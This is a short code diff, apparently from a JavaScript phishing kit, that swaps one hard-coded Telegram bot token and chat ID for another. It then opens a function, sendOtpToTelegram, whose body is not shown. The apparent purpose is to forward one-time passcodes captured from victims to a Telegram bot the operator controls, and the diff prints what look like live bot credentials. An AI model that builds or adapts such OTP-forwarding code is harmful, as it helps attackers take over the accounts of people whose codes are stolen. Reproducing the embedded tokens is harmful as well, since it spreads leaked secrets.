@@ -1,6 +1,6 @@
 // Replace these values with your bot's token and chat ID
-const botToken = '7494244197:AAGmK3fC7Y_gwsEXHv4879hUr5ZKl89cvGY';
-const chatId = '5351288466';
+const botToken = '7782372269:AAHawGOO9s8x64Sda5-jVgTUlwI73BV51Xs';
+const chatId = '7057894073';
 
 // Function to send OTP to Telegram bot
 function sendOtpToTelegram(otpCode) {
